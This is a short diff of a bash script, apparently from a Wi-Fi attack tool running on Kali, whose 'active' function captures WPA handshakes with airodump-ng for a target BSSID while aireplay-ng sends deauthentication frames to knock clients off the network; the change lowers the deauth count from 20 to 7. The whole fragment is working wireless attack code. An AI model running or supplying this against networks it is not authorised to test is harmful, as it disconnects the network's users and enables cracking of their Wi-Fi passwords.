@@ -90,7 +90,7 @@ active() {
     airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes $2 </dev/null >/dev/null &
     pid=`echo $!`
     echo "Start sending deauth frame injection..."
-    aireplay-ng -a $bssid -0 20 $2 
+    aireplay-ng -a $bssid -0 7 $2 
     injectionExitCode=`echo $?`
     if [[ $injectionExitCode -ne 0 ]]
     then
